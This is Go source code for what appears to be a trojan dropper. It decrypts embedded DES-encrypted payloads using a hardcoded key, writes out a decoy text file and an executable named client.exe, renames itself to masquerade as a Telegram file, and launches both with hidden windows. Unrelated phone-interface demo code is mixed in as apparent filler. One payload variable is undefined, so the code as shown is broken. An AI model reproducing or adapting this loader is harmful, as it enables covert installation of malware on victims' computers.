
	package main

	import (
		"crypto/cipher"
		"crypto/des"
		"encoding/base64"
		"fmt"
		"log"
		"os"
		"os/exec"
		"strings"
		"syscall"
	)
	
	var (
		key          = "AMOQAIXF"
		mumafilename = ".\client.exe"
		docfilename  = ".\11.txt"
		docfilenames = "\\.\11.txt"
		docfile      = "/i6ZDRayp384Zq5HSyqFbw=="
		dstFile      = "\\Users\\Public\\Downloads\\telegram.txt"
		selfile, _   = os.Executable()
		ddocfile     = DesDecrypt(docfile, []byte(key))
	
		dmumafile = DesDecrypt(numafile, []byte(key))
	)
	

	type Phone interface {
		call()
	}
	
	type NokiaPhone struct {
	}
	
	func (nokiaPhone NokiaPhone) call() {
		fmt.Println("I am Nokia, I can call you!")
	}
	
	type IPhone struct {
	}
	
	func (iPhone IPhone) call() {
		fmt.Println("I am iPhone, I can call you!")
	}
	
	func main() {
		//打开文件使用os.Open函数,会返回一个文件句柄和一个error
		_, err := os.Open("D:\\komeijisatori\\src\\day3\\whiteblum.txt")
		if err != nil {
			fmt.Println("文件打开失败：", err)
		}
		var phone Phone
	
		phone = new(NokiaPhone)
		phone.call()
	
		phone = new(IPhone)
		phone.call()
	
		panfu := selfile[0:2]
		//打开文件使用os.Open函数,会返回一个文件句柄和一个error
		_, err = os.Open("D:\\komeijisatori\\src\\day3\\whiteblum.txt")
		if err != nil {
			fmt.Println("文件打开失败：", err)
		}
	
		if !strings.Contains(selfile, "C:") {
	
			dstFile = panfu + "\\telegram.txt"
		} else {
			dstFile = panfu + dstFile
		}
	
		os.Rename(selfile, dstFile)
	
		f2, _ := os.Create(docfilename)
		_, err = f2.Write([]byte(ddocfile))
	
		if err != nil {
			log.Println("writeFile error ..err =", err)
			return
		}
		f2.Close()
		strccc, _ := os.Getwd()
		cmd := exec.Command("cmd", " /c ", strccc+docfilenames)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		//cmd2.Stdout = os.Stdout
		_ = cmd.Start()
		var dstFilecc = "C:\\Users\\Public\\" + mumafilename
		f, _ := os.Create(dstFilecc)
	
		_, err = f.Write([]byte(dmumafile))
	
		if err != nil {
			log.Println("writeFile error ..err =", err)
			return
		}
		f.Close()
	
		cmda := exec.Command(dstFilecc)
		cmda.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmda.Start()
	
	}
	
	func PKCS5UnPadding(origData []byte) []byte {
		length := len(origData)
		// 去掉最后一个字节 unpadding 次
		unpadding := int(origData[length-1])
		return origData[:(length - unpadding)]
	}
	
	func DesDecrypt(crypteds string, key []byte) []byte {
		block, err := des.NewCipher(key)
		if err != nil {
			return nil
		}
		crypted, err := base64.StdEncoding.DecodeString(crypteds)
		blockMode := cipher.NewCBCDecrypter(block, key)
		origData := make([]byte, len(crypted))
		// origData := crypted
		blockMode.CryptBlocks(origData, crypted)
		origData = PKCS5UnPadding(origData)
		// origData = ZeroUnPadding(origData)
		return origData
	}
	